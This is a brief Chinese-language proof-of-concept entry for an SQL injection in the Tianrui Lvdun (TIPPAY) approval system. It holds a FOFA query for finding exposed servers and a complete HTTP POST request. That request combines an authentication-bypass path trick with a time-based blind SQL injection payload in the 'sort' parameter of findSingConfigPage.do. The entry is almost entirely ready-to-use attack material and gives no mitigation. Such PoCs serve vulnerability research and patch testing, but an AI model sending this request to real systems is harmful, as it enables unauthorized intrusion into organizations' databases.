# 天锐绿盾审批系统findSingConfigPage存在SQL注入

## fofa
```javascript
app="TIPPAY-绿盾审批系统"
```

## poc
```javascript
POST /trwfe/login.jsp/.%2e/thirdSystemConfig/findSingConfigPage.do HTTP/1.1
Host:
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:127.0) Gecko/20100101 Firefox/127.0
Priority: u=1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded

sort=app_id%20OR+(SELECT+1183+FROM+(SELECT(SLEEP(5)))UPad)
```
